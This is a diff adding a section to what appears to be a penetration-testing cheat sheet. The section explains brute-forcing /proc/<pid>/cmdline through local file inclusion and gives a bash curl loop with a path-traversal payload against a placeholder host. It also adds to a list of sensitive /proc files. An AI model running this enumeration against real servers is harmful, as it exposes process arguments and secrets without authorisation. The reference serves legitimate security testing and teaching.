@@ -99,6 +99,22 @@ for i in {1..254}; do (ping -c 1 10.10.10.${i} | grep "bytes from" | grep -v "Un
 /proc/net/fib_trie
 /proc/version
 /proc/self/environ
+/proc/self/cmdline
+```
+
+### Process file (PID) brute-force
+The file “/proc//cmdline” serves as a repository for the command-line arguments that have been provided to a specific process identified by its (PID). 
+This allows for enumerating all the running processes based on their PID.     
+This could be well used for exploiting an LFI.
+
+```bash
+# Example script to exploit LFI
+for i in {0..999}; do
+    pid=$i
+    url="http://remote.com/?page=../../../..//proc/$pid/cmdline"
+    curl -s "$url" | tee -a log.txt
+    echo ""
+done
 ```
 
 ### Directory / file copy (symlink)
